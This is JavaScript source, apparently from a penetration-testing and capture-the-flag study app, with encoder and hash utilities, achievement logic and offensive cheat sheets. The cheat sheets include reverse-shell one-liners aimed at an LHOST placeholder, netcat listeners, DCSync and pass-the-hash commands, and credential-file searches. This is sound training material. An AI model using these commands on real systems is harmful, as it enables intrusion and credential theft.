// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1G — ENCODER  (from encoder.js — browser-compatible)
// ═══════════════════════════════════════════════════════════════════════════════

function _rot13(s) {
  return s.replace(/[a-zA-Z]/g, c => {
    const b = c <= 'Z' ? 65 : 97;
    return String.fromCharCode(((c.charCodeAt(0) - b + 13) % 26) + b);
  });
}
function _htmlEncode(s) { return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#x27;'); }
function _htmlDecode(s) { const t=document.createElement('textarea'); t.innerHTML=s; return t.value; }

// MD5 pure JS
function _md5(input) {
  function safeAdd(x,y){const l=(x&0xFFFF)+(y&0xFFFF);return ((x>>16)+(y>>16)+(l>>16))<<16|l&0xFFFF;}
  function brl(n,c){return n<<c|n>>>32-c;}
  function ff(a,b,c,d,x,s,t){return safeAdd(brl(safeAdd(safeAdd(a,b&c|~b&d),safeAdd(x,t)),s),b);}
  function gg(a,b,c,d,x,s,t){return safeAdd(brl(safeAdd(safeAdd(a,b&d|c&~d),safeAdd(x,t)),s),b);}
  function hh(a,b,c,d,x,s,t){return safeAdd(brl(safeAdd(safeAdd(a,b^c^d),safeAdd(x,t)),s),b);}
  function ii(a,b,c,d,x,s,t){return safeAdd(brl(safeAdd(safeAdd(a,c^(b|~d)),safeAdd(x,t)),s),b);}
  function blk(s){const m=[];for(let i=0;i<64;i+=4)m[i>>2]=s.charCodeAt(i)+(s.charCodeAt(i+1)<<8)+(s.charCodeAt(i+2)<<16)+(s.charCodeAt(i+3)<<24);return m;}
  function cycle(x,k){
    let[a,b,c,d]=x;
    a=ff(a,b,c,d,k[0],7,-680876936);d=ff(d,a,b,c,k[1],12,-389564586);c=ff(c,d,a,b,k[2],17,606105819);b=ff(b,c,d,a,k[3],22,-1044525330);
    a=ff(a,b,c,d,k[4],7,-176418897);d=ff(d,a,b,c,k[5],12,1200080426);c=ff(c,d,a,b,k[6],17,-1473231341);b=ff(b,c,d,a,k[7],22,-45705983);
    a=ff(a,b,c,d,k[8],7,1770035416);d=ff(d,a,b,c,k[9],12,-1958414417);c=ff(c,d,a,b,k[10],17,-42063);b=ff(b,c,d,a,k[11],22,-1990404162);
    a=ff(a,b,c,d,k[12],7,1804603682);d=ff(d,a,b,c,k[13],12,-40341101);c=ff(c,d,a,b,k[14],17,-1502002290);b=ff(b,c,d,a,k[15],22,1236535329);
    a=gg(a,b,c,d,k[1],5,-165796510);d=gg(d,a,b,c,k[6],9,-1069501632);c=gg(c,d,a,b,k[11],14,643717713);b=gg(b,c,d,a,k[0],20,-373897302);
    a=gg(a,b,c,d,k[5],5,-701558691);d=gg(d,a,b,c,k[10],9,38016083);c=gg(c,d,a,b,k[15],14,-660478335);b=gg(b,c,d,a,k[4],20,-405537848);
    a=gg(a,b,c,d,k[9],5,568446438);d=gg(d,a,b,c,k[14],9,-1019803690);c=gg(c,d,a,b,k[3],14,-187363961);b=gg(b,c,d,a,k[8],20,1163531501);
    a=gg(a,b,c,d,k[13],5,-1444681467);d=gg(d,a,b,c,k[2],9,-51403784);c=gg(c,d,a,b,k[7],14,1735328473);b=gg(b,c,d,a,k[12],20,-1926607734);
    a=hh(a,b,c,d,k[5],4,-378558);d=hh(d,a,b,c,k[8],11,-2022574463);c=hh(c,d,a,b,k[11],16,1839030562);b=hh(b,c,d,a,k[14],23,-35309556);
    a=hh(a,b,c,d,k[1],4,-1530992060);d=hh(d,a,b,c,k[4],11,1272893353);c=hh(c,d,a,b,k[7],16,-155497632);b=hh(b,c,d,a,k[10],23,-1094730640);
    a=hh(a,b,c,d,k[13],4,681279174);d=hh(d,a,b,c,k[0],11,-358537222);c=hh(c,d,a,b,k[3],16,-722521979);b=hh(b,c,d,a,k[6],23,76029189);
    a=hh(a,b,c,d,k[9],4,-640364487);d=hh(d,a,b,c,k[12],11,-421815835);c=hh(c,d,a,b,k[15],16,530742520);b=hh(b,c,d,a,k[2],23,-995338651);
    a=ii(a,b,c,d,k[0],6,-198630844);d=ii(d,a,b,c,k[7],10,1126891415);c=ii(c,d,a,b,k[14],15,-1416354905);b=ii(b,c,d,a,k[5],21,-57434055);
    a=ii(a,b,c,d,k[12],6,1700485571);d=ii(d,a,b,c,k[3],10,-1894986606);c=ii(c,d,a,b,k[10],15,-1051523);b=ii(b,c,d,a,k[1],21,-2054922799);
    a=ii(a,b,c,d,k[8],6,1873313359);d=ii(d,a,b,c,k[15],10,-30611744);c=ii(c,d,a,b,k[6],15,-1560198380);b=ii(b,c,d,a,k[13],21,1309151649);
    a=ii(a,b,c,d,k[4],6,-145523070);d=ii(d,a,b,c,k[11],10,-1120210379);c=ii(c,d,a,b,k[2],15,718787259);b=ii(b,c,d,a,k[9],21,-343485551);
    x[0]=safeAdd(a,x[0]);x[1]=safeAdd(b,x[1]);x[2]=safeAdd(c,x[2]);x[3]=safeAdd(d,x[3]);return x;
  }
  let str = unescape(encodeURIComponent(input));
  const n = str.length;
  const state = [1732584193,-271733879,-1732584194,271733878];
  let i;
  for(i=64;i<=n;i+=64) cycle(state, blk(str.substring(i-64,i)));
  str=str.substring(i-64);
  const tail=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0];
  for(i=0;i<str.length;i++) tail[i>>2]|=str.charCodeAt(i)<<((i%4)<<3);
  tail[i>>2]|=0x80<<((i%4)<<3);
  if(i>55){cycle(state,tail);tail.fill(0);}
  tail[14]=n*8;
  cycle(state,tail);
  const rhex=n=>{ let s=''; for(let j=0;j<4;j++) s+=('0'+((n>>>(j*8))&0xFF).toString(16)).slice(-2); return s; };
  return state.map(rhex).join('');
}

async function applyEncoderOp(op, input) {
  try {
    switch(op) {
      case 'b64-encode': return btoa(unescape(encodeURIComponent(input)));
      case 'b64-decode': return decodeURIComponent(escape(atob(input)));
      case 'url-encode': return encodeURIComponent(input);
      case 'url-decode': return decodeURIComponent(input);
      case 'html-encode': return _htmlEncode(input);
      case 'html-decode': return _htmlDecode(input);
      case 'hex-encode': return Array.from(new TextEncoder().encode(input)).map(b=>b.toString(16).padStart(2,'0')).join(' ');
      case 'hex-decode': { const hex=input.replace(/\s+/g,''); const bytes=[]; for(let i=0;i<hex.length;i+=2) bytes.push(parseInt(hex.substr(i,2),16)); return new TextDecoder().decode(new Uint8Array(bytes)); }
      case 'rot13': return _rot13(input);
      case 'binary-encode': return Array.from(new TextEncoder().encode(input)).map(b=>b.toString(2).padStart(8,'0')).join(' ');
      case 'binary-decode': { const bits=input.trim().split(/\s+/); return new TextDecoder().decode(new Uint8Array(bits.map(b=>parseInt(b,2)))); }
      case 'decimal-to-hex': return input.trim().split(/\s+/).map(p=>parseInt(p).toString(16).toUpperCase()).join(' ');
      case 'hex-to-decimal': return input.trim().split(/\s+/).map(p=>parseInt(p,16)).join(' ');
      case 'md5': return _md5(input);
      case 'sha1': { const buf=await crypto.subtle.digest('SHA-1',new TextEncoder().encode(input)); return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join(''); }
      case 'sha256': { const buf=await crypto.subtle.digest('SHA-256',new TextEncoder().encode(input)); return Array.from(new Uint8Array(buf)).map(b=>b.toString(16).padStart(2,'0')).join(''); }
      case 'jwt-decode': {
        const parts=input.split('.');
        if(parts.length!==3) throw new Error('Not a valid JWT');
        const d=(s)=>{ const pad=s.length%4; const padded=s+'===='.slice(0,pad?4-pad:0); return JSON.parse(atob(padded.replace(/-/g,'+').replace(/_/g,'/'))); };
        return `=== HEADER ===\n${JSON.stringify(d(parts[0]),null,2)}\n\n=== PAYLOAD ===\n${JSON.stringify(d(parts[1]),null,2)}\n\n=== SIGNATURE ===\n${parts[2]}`;
      }
      default: throw new Error(`Unknown operation: ${op}`);
    }
  } catch(e) { throw new Error(`${op} failed: ${e.message}`); }
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1H — PROGRESS, SKILL TREE, ACHIEVEMENTS  (from progress.js)
// ═══════════════════════════════════════════════════════════════════════════════

const SKILL_TREE = {
  webSecurity:    { label:'Web Security',icon:'🌐', nodes:['SQL Injection','XSS','SSRF','File Upload','Auth Bypass','API Hacking','IDOR','SSTI'], keywords:['sql','xss','ssrf','file upload','auth bypass','api','idor','ssti','web','http','gobuster','ffuf','feroxbuster','nikto','sqlmap','wpscan'] },
  network:        { label:'Network',icon:'📡', nodes:['Port Scanning','Packet Analysis','MITM','Firewall Bypass','VPN/Tunnelling','Cisco/Networking','Protocol Analysis'], keywords:['nmap','masscan','rustscan','pcap','wireshark','tcpdump','mitm','firewall','vpn','tunnel','cisco','port scan','network','snmp','dhcp'] },
  activeDirectory:{ label:'Active Directory',icon:'🏰', nodes:['Kerberoasting','AS-REP Roasting','Pass the Hash','BloodHound','GPO Abuse','DCSync','Silver/Golden Ticket'], keywords:['kerberoast','asrep','pass the hash','bloodhound','gpo','dcsync','golden ticket','silver ticket','active directory','ldap','kerberos','mimikatz','impacket','crackmapexec'] },
  privEsc:        { label:'Privilege Escalation',icon:'⬆️', nodes:['SUID/SGID','Sudo Misconfig','Cron Jobs','PATH Hijacking','Kernel Exploits','Token Impersonation','DLL Hijacking'], keywords:['suid','sgid','sudo','cron','path hijack','kernel exploit','token impersonation','dll hijack','linpeas','winpeas','privilege escalation','privesc','gtfobins'] },
  cryptography:   { label:'Cryptography',icon:'🔐', nodes:['Hash Cracking','Encoding/Decoding','RSA','AES','Classic Ciphers','JWT'], keywords:['hash','crack','hashcat','john','base64','encode','decode','rsa','aes','cipher','jwt','crypto','md5','sha'] },
  forensics:      { label:'Forensics',icon:'🔍', nodes:['File Carving','Steganography','Memory Analysis','Log Analysis','PCAP Analysis'], keywords:['forensic','stego','steganography','volatility','memory','log','pcap','binwalk','strings','file carv','autopsy','wireshark'] },
  reverseEng:     { label:'Reverse Engineering',icon:'⚙️', nodes:['Static Analysis','Dynamic Analysis','Buffer Overflow','ROP Chains','Debugging'], keywords:['reverse','binary','elf','ghidra','ida','gdb','pwndbg','buffer overflow','bof','rop','objdump','radare','pwn'] },
  osint:          { label:'OSINT',icon:'🕵️', nodes:['Username Recon','Metadata','Google Dorking','Social Engineering','Domain Intel'], keywords:['osint','recon','sherlock','theharvester','exiftool','metadata','dork','social engineering','whois','shodan','censys','maltego'] },
};

const ACHIEVEMENTS = [
  {id:'first-blood',    name:'First Blood',         icon:'🩸',description:'Complete your first lab',                              check:s=>s.totalCompleted>=1},
  {id:'script-kiddie',  name:'Script Kiddie No More',icon:'🛠️',description:'Use 10 different tools across sessions',             check:s=>s.uniqueToolsUsed>=10},
  {id:'root-hunter',    name:'Root Hunter',          icon:'👑',description:'Root your first HTB machine',                        check:s=>s.htbRooted>=1},
  {id:'speed-runner',   name:'Speed Runner',         icon:'⚡',description:'Complete a Medium box under 2 hours',               check:s=>s.fastestMedium!==null&&s.fastestMedium<=120},
  {id:'persistence-7',  name:'Persistence',          icon:'🔥',description:'7 day streak',                                       check:s=>s.currentStreak>=7},
  {id:'on-a-roll',      name:'On a Roll',            icon:'🎯',description:'30 day streak',                                      check:s=>s.currentStreak>=30},
  {id:'unstoppable',    name:'Unstoppable',          icon:'🚀',description:'90 day streak',                                      check:s=>s.currentStreak>=90},
  {id:'web-warrior',    name:'Web Warrior',          icon:'🌐',description:'Complete 5 web-focused labs',                        check:s=>s.webLabsCompleted>=5},
  {id:'ad-destroyer',   name:'AD Destroyer',         icon:'🏰',description:'Complete 3 Active Directory labs',                   check:s=>s.adLabsCompleted>=3},
  {id:'flag-collector', name:'Flag Collector',       icon:'🚩',description:'Capture 25 total flags',                             check:s=>s.totalFlags>=25},
  {id:'polyglot',       name:'Polyglot',             icon:'🌍',description:'Complete labs on 3 different platforms',              check:s=>s.platformsUsed>=3},
  {id:'night-owl',      name:'Night Owl',            icon:'🦉',description:'Complete a lab between midnight and 5am',            check:s=>s.nightOwlCount>=1},
  {id:'no-hints',       name:'No Hints Needed',      icon:'🧠',description:'Complete a full lab at hint level 1 throughout',     check:s=>s.noHintCompletions>=1},
  {id:'teach-yourself', name:'Teach Yourself',       icon:'📚',description:'Use Teach Me Mode for an entire session',            check:s=>s.teachMeSessions>=1},
  {id:'clean-method',   name:'Clean Methodology',    icon:'✅',description:'Complete a lab with all phases ticked in order',     check:s=>s.cleanMethodologyCount>=1},
  {id:'speed-demon',    name:'Speed Demon',          icon:'💨',description:'Complete an Easy box under 30 minutes',              check:s=>s.fastestEasy!==null&&s.fastestEasy<=30},
  {id:'encyclopaedia',  name:'Encyclopaedia',        icon:'📖',description:'Unlock 15 skill tree nodes',                        check:s=>s.unlockedNodes>=15},
  {id:'veteran',        name:'Veteran',              icon:'🎖️',description:'Complete 50 labs total',                            check:s=>s.totalCompleted>=50},
];

function computeProgressStats(sessions, streak, skillNodes) {
  const completed = sessions.filter(s=>s.flagsCaptured>0||s.methodologyCompleted.includes('Flag Capture'));
  const uniqueTools = new Set(sessions.flatMap(s=>s.toolsUsed||[]));
  const platforms = new Set(sessions.map(s=>s.platform).filter(Boolean));
  const htbRooted = sessions.filter(s=>s.platform==='HTB'&&(s.flagsCaptured>=2||s.methodologyCompleted.includes('Flag Capture'))).length;
  const medTimes = sessions.filter(s=>s.difficulty==='Medium'&&s.durationMinutes).map(s=>s.durationMinutes);
  const easyTimes = sessions.filter(s=>s.difficulty==='Easy'&&s.durationMinutes).map(s=>s.durationMinutes);
  const allNodes = Object.values(skillNodes).flat();
  const uniqueNodes = new Set(allNodes);
  const platCounts = {};
  sessions.forEach(s=>{ if(s.platform) platCounts[s.platform]=(platCounts[s.platform]||0)+1; });
  const favPlatform = Object.entries(platCounts).sort((a,b)=>b[1]-a[1])[0];
  const hardestByDiff = {Easy:0,Medium:0,Hard:0,Insane:0};
  sessions.forEach(s=>{ if(s.difficulty) hardestByDiff[s.difficulty]++; });
  const hardest = ['Insane','Hard','Medium','Easy'].find(d=>hardestByDiff[d]>0)||null;
  const totalMinutes = sessions.reduce((sum,s)=>sum+(s.durationMinutes||0),0);
  return {
    totalCompleted: completed.length,
    totalSessions: sessions.length,
    currentStreak: streak.current||0,
    longestStreak: streak.longest||0,
    totalTimeMinutes: totalMinutes,
    favouritePlatform: favPlatform?favPlatform[0]:'N/A',
    hardestCompleted: hardest||'N/A',
    totalFlags: sessions.reduce((sum,s)=>sum+(s.flagsCaptured||0),0),
    fastestMedium: medTimes.length?Math.min(...medTimes):null,
    fastestEasy: easyTimes.length?Math.min(...easyTimes):null,
    uniqueToolsUsed: uniqueTools.size,
    htbRooted,
    webLabsCompleted: sessions.filter(s=>s.techniques&&s.techniques.some(t=>['sql','xss','ssrf','web'].some(k=>t.toLowerCase().includes(k)))).length,
    adLabsCompleted: sessions.filter(s=>s.techniques&&s.techniques.some(t=>['active directory','ad','kerberos','bloodhound'].some(k=>t.toLowerCase().includes(k)))).length,
    platformsUsed: platforms.size,
    nightOwlCount: sessions.filter(s=>s.completedHour>=0&&s.completedHour<5).length,
    noHintCompletions: sessions.filter(s=>(s.maxHintLevel||1)<=1&&s.flagsCaptured>0).length,
    teachMeSessions: sessions.filter(s=>s.usedTeachMe).length,
    cleanMethodologyCount: sessions.filter(s=>s.cleanMethodology).length,
    unlockedNodes: uniqueNodes.size,
    platformCounts: platCounts,
    difficultyBreakdown: hardestByDiff,
    sessions,
    skillNodes,
  };
}

function checkAchievements(stats, achievementsData) {
  const newlyUnlocked = [];
  ACHIEVEMENTS.forEach(ach => {
    if(!achievementsData[ach.id] && ach.check(stats)) {
      achievementsData[ach.id] = { unlockedAt: new Date().toISOString() };
      newlyUnlocked.push(ach);
    }
  });
  return newlyUnlocked;
}

// ═══════════════════════════════════════════════════════════════════════════════
// SECTION 1I — CHEAT SHEETS  (condensed)
// ═══════════════════════════════════════════════════════════════════════════════

const CHEATSHEETS = {
  nmap: { title:'Nmap Flags & Scan Types', sections:[
    { heading:'Scan Types', items:[{flag:'-sS',desc:'SYN stealth scan (root)'},{flag:'-sT',desc:'TCP connect scan'},{flag:'-sU',desc:'UDP scan'},{flag:'-sV',desc:'Version detection'},{flag:'-sC',desc:'Default NSE scripts'},{flag:'-O',desc:'OS detection'},{flag:'-A',desc:'Aggressive (OS+ver+scripts+trace)'}]},
    { heading:'Ports', items:[{flag:'-p-',desc:'All 65535 ports'},{flag:'-p 80,443',desc:'Specific ports'},{flag:'--top-ports 1000',desc:'Top 1000 ports'},{flag:'-F',desc:'Fast scan (top 100)'}]},
    { heading:'Timing', items:[{flag:'-T4',desc:'Aggressive (good default)'},{flag:'-T5',desc:'Insane (fastest)'},{flag:'--min-rate 5000',desc:'Min packets/sec'}]},
    { heading:'Output', items:[{flag:'-oA basename',desc:'All formats'},{flag:'-oN file.txt',desc:'Normal output'},{flag:'--open',desc:'Only open ports'},{flag:'-v / -vv',desc:'Verbosity'}]},
    { heading:'Useful Scripts', items:[{flag:'--script=vuln',desc:'Vulnerability scripts'},{flag:'--script=smb-vuln-ms17-010',desc:'EternalBlue check'},{flag:'--script=http-title',desc:'HTTP page title'},{flag:'--script=ftp-anon',desc:'FTP anonymous login'}]},
    { heading:'Quick Scan Patterns', items:[{flag:'nmap -sV -sC -p- --min-rate 5000 <IP>',desc:'Full port + version + scripts'},{flag:'sudo nmap -A -T4 -p- <IP>',desc:'Aggressive full scan'},{flag:'nmap -sU --top-ports 100 -sV <IP>',desc:'Top 100 UDP ports'}]},
  ]},
  linprivesc: { title:'Linux Privilege Escalation Checklist', sections:[
    { heading:'Basic Recon', items:[{flag:'id && whoami',desc:'Current user and groups'},{flag:'uname -a',desc:'Kernel version'},{flag:'cat /etc/os-release',desc:'OS info'},{flag:'ps aux',desc:'Running processes'},{flag:'netstat -tulpn',desc:'Listening ports'}]},
    { heading:'SUID/SGID', items:[{flag:'find / -perm -4000 -type f 2>/dev/null',desc:'Find SUID binaries'},{flag:'find / -perm -2000 -type f 2>/dev/null',desc:'Find SGID binaries'},{flag:'Check GTFOBins for abuse',desc:'https://gtfobins.github.io'}]},
    { heading:'Sudo', items:[{flag:'sudo -l',desc:'What can current user run as sudo'},{flag:'Check GTFOBins for sudo abuse',desc:'Misconfigs like NOPASSWD'}]},
    { heading:'Cron Jobs', items:[{flag:'cat /etc/crontab',desc:'System cron jobs'},{flag:'ls -la /etc/cron.*',desc:'Cron directories'},{flag:'crontab -l',desc:"Current user's cron"},{flag:'pspy64',desc:'Monitor running processes without root'}]},
    { heading:'Writable Files', items:[{flag:'find / -writable -type f 2>/dev/null | grep -v proc',desc:'Writable files'},{flag:'find / -writable -type d 2>/dev/null',desc:'Writable directories'}]},
    { heading:'Passwords', items:[{flag:'cat /etc/passwd',desc:'User list'},{flag:'cat ~/.bash_history',desc:'Command history'},{flag:'find / -name "*.conf" -readable 2>/dev/null',desc:'Readable config files'},{flag:'find / -name "id_rsa" 2>/dev/null',desc:'SSH private keys'}]},
  ]},
  winprivesc: { title:'Windows Privilege Escalation Checklist', sections:[
    { heading:'Basic Recon', items:[{flag:'whoami /all',desc:'User and all privileges'},{flag:'net user',desc:'Local users'},{flag:'net localgroup administrators',desc:'Local admins'},{flag:'systeminfo',desc:'OS, hotfixes, architecture'}]},
    { heading:'Unquoted Service Paths', items:[{flag:'wmic service get name,displayname,pathname,startmode | findstr /v "C:\\Windows"',desc:'Find unquoted paths'},{flag:'sc qc <service>',desc:'Query service config'}]},
    { heading:'AlwaysInstallElevated', items:[{flag:'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',desc:'Check HKLM'},{flag:'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',desc:'Check HKCU'}]},
    { heading:'Saved Credentials', items:[{flag:'cmdkey /list',desc:'Stored credentials'},{flag:'dir /s /b pass.txt == *cred* == *vnc* == *.config* 2>nul',desc:'Config files with creds'},{flag:'reg query HKLM /f password /t REG_SZ /s',desc:'Registry passwords'}]},
    { heading:'Token Impersonation', items:[{flag:'whoami /priv',desc:'Check SeImpersonatePrivilege'},{flag:'PrintSpoofer / JuicyPotato / GodPotato',desc:'Potato exploits for SeImpersonatePrivilege'}]},
  ]},
  webenum: { title:'Web Enumeration Checklist', sections:[
    { heading:'Initial Recon', items:[{flag:'curl -I http://<IP>',desc:'HTTP headers (server version, tech stack)'},{flag:'curl http://<IP>/robots.txt',desc:'Robots.txt (always check!)'},{flag:'curl http://<IP>/sitemap.xml',desc:'Sitemap'},{flag:'wappalyzer / whatweb',desc:'Technology fingerprinting'}]},
    { heading:'Directory Fuzzing', items:[{flag:'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt',desc:'Basic dir fuzz'},{flag:'ffuf -u http://<IP>/FUZZ -w <wordlist> -fc 404',desc:'Fast fuzzing with filter'},{flag:'feroxbuster -u http://<IP> -w <wordlist> --auto-tune',desc:'Recursive discovery'}]},
    { heading:'File Extensions', items:[{flag:'-x php,txt,html,bak,old,conf,zip',desc:'Add to gobuster/ffuf'},{flag:'Try .bak, .old, .zip on found files',desc:'Backup file discovery'},{flag:'.git, .svn, .env',desc:'Source control and config exposure'}]},
    { heading:'Virtual Hosts', items:[{flag:'gobuster vhost -u http://<IP> -w subdomains.txt --append-domain',desc:'VHOST brute force'},{flag:'Add found vhosts to /etc/hosts',desc:'Update /etc/hosts file'}]},
    { heading:'Parameter Fuzzing', items:[{flag:'ffuf -u "http://<IP>/page?FUZZ=test" -w params.txt',desc:'Parameter discovery'},{flag:'arjun -u http://<IP>/page',desc:'Parameter finder tool'}]},
  ]},
  adattacks: { title:'Active Directory Attack Checklist', sections:[
    { heading:'Enumeration', items:[{flag:'bloodhound-python -u user -p pass -d CORP.LOCAL -dc <DC> -c all',desc:'BloodHound collection'},{flag:'ldapsearch -H ldap://<DC> -x -b "DC=corp,DC=local"',desc:'LDAP enumeration'},{flag:'enum4linux-ng -A <IP>',desc:'SMB/LDAP enum'}]},
    { heading:'Kerberoasting', items:[{flag:'impacket-GetUserSPNs CORP.LOCAL/user:pass -dc-ip <DC> -request',desc:'Request TGS tickets'},{flag:'hashcat -a 0 -m 13100 hash.txt rockyou.txt',desc:'Crack TGS hash'}]},
    { heading:'AS-REP Roasting', items:[{flag:'impacket-GetNPUsers CORP.LOCAL/ -usersfile users.txt -dc-ip <DC> -no-pass',desc:'Get AS-REP hashes'},{flag:'hashcat -a 0 -m 18200 hash.txt rockyou.txt',desc:'Crack AS-REP hash'}]},
    { heading:'Pass the Hash', items:[{flag:'impacket-psexec CORP.LOCAL/admin@<IP> -hashes :NTLM_HASH',desc:'PTH with psexec'},{flag:'crackmapexec smb <IP> -u admin -H NTLM_HASH',desc:'Verify hash works'}]},
    { heading:'DCSync', items:[{flag:'impacket-secretsdump CORP.LOCAL/admin:pass@<DC>',desc:'Dump all NTLM hashes'},{flag:'mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt',desc:'DCSync with mimikatz'}]},
  ]},
  revshells: { title:'Reverse Shell Quick Reference', sections:[
    { heading:'Bash', items:[{flag:'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',desc:'Standard bash TCP redirect'}]},
    { heading:'Python 3', items:[{flag:'python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("bash")\'',desc:'Python3 PTY shell'}]},
    { heading:'PHP', items:[{flag:'php -r \'$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");\'',desc:'PHP one-liner'}]},
    { heading:'PowerShell', items:[{flag:'powershell -nop -c "$c=New-Object Net.Sockets.TCPClient(\'LHOST\',LPORT)..."',desc:'PS reverse shell'}]},
    { heading:'Shell Stabilisation', items:[{flag:'python3 -c \'import pty;pty.spawn("/bin/bash")\'',desc:'Step 1: Spawn PTY'},{flag:'Ctrl+Z  →  stty raw -echo  →  fg',desc:'Step 2: Raw mode'},{flag:'export TERM=xterm; stty rows 40 cols 160',desc:'Step 3: Fix terminal size'}]},
    { heading:'Listener', items:[{flag:'nc -lvnp 4444',desc:'Standard netcat listener'},{flag:'rlwrap nc -lvnp 4444',desc:'With readline support'},{flag:'pwncat-cs -lp 4444',desc:'Pwncat with post-exploit modules'}]},
  ]},
  hashid: { title:'Hash Identification Guide', sections:[
    { heading:'Common Hash Formats', items:[
      {flag:'32 hex chars',desc:'MD5 (hashcat -m 0 / john --format=raw-md5)'},
      {flag:'40 hex chars',desc:'SHA1 (hashcat -m 100)'},
      {flag:'64 hex chars',desc:'SHA256 (hashcat -m 1400)'},
      {flag:'$1$...',desc:'MD5crypt (hashcat -m 500)'},
      {flag:'$5$...',desc:'SHA256crypt (hashcat -m 7400)'},
      {flag:'$6$...',desc:'SHA512crypt (hashcat -m 1800)'},
      {flag:'$2a$ / $2b$',desc:'bcrypt (hashcat -m 3200, slow!)'},
      {flag:'32 hex (Windows)',desc:'NTLM (hashcat -m 1000)'},
      {flag:'user:LM:NT hash',desc:'/etc/shadow NTLM — use NT part'},
      {flag:'$krb5tgs$...',desc:'Kerberoast TGS (hashcat -m 13100)'},
      {flag:'$krb5asrep$...',desc:'AS-REP Roast (hashcat -m 18200)'},
    ]},
    { heading:'Tools', items:[{flag:'hash-identifier <hash>',desc:'Identify hash type'},{flag:'hashid <hash>',desc:'Python hash identifier'},{flag:'hashcat --identify hash.txt',desc:'Hashcat hash identification (v6.2.5+)'}]},
  ]},
};

const PORT_SERVICES = {
  21:'FTP — Unauthenticated access, anonymous login, file upload/download',
  22:'SSH — Brute force, key-based auth bypass, version exploits',
  23:'Telnet — Cleartext credentials, often unpatched',
  25:'SMTP — Email relay, user enumeration (VRFY/EXPN)',
  53:'DNS — Zone transfer (AXFR), subdomain enumeration',
  80:'HTTP — Web app vulnerabilities, directory fuzzing',
  88:'Kerberos — Kerberoasting, AS-REP roasting, ticket attacks',
  110:'POP3 — Email access, credential sniffing',
  111:'RPCbind — NFS enumeration, RPC services',
  135:'MSRPC — Remote procedure calls, Dcom exploits',
  139:'NetBIOS — SMB over NetBIOS, name service enum',
  143:'IMAP — Email access, credential attacks',
  389:'LDAP — Active Directory enumeration, anonymous bind',
  443:'HTTPS — Web app vulnerabilities over TLS',
  445:'SMB — EternalBlue (MS17-010), pass-the-hash, share enum',
  512:'rexec — Remote execution, weak auth',
  513:'rlogin — Remote login, trust relationships',
  514:'rsh — Remote shell, no auth on some configs',
  593:'HTTP RPC — DCOM over HTTP',
  631:'IPP — Printer service, potential RCE',
  873:'rsync — File sync, potential data exposure',
  1433:'MSSQL — Database access, xp_cmdshell RCE',
  1521:'Oracle DB — Database access, default credentials',
  2049:'NFS — Mount remote file systems, check exports',
  2375:'Docker API — Container management, potential RCE',
  3306:'MySQL — Database access, brute force',
  3389:'RDP — Remote desktop, BlueKeep, brute force',
  5432:'PostgreSQL — Database access, COPY TO/FROM PROGRAM',
  5900:'VNC — Remote desktop, weak passwords',
  6379:'Redis — Unauthenticated access, config write, RCE',
  6443:'Kubernetes API — Cluster management, privilege escalation',
  8080:'HTTP Alt — Web app, proxy, admin panels',
  8443:'HTTPS Alt — Web app over TLS',
  8888:'HTTP Alt — Jupyter notebooks, admin panels',
  9200:'Elasticsearch — Unauthenticated access, data exposure',
  27017:'MongoDB — Unauthenticated access, data exposure',
};
